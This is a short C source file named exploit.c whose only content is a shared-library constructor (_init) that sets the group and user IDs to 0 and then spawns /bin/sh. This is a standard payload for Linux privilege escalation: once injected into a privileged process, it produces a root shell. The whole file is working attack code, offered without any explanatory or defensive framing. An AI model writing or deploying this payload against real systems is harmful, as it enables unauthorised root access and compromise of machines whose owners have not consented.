// exploit.c
#include <stdlib.h>
#include <unistd.h>
void _init(void) {
    setgid(0);
    setuid(0);
    // /bin/sh will now be running as root
    execl("/bin/sh", "sh", NULL);
}
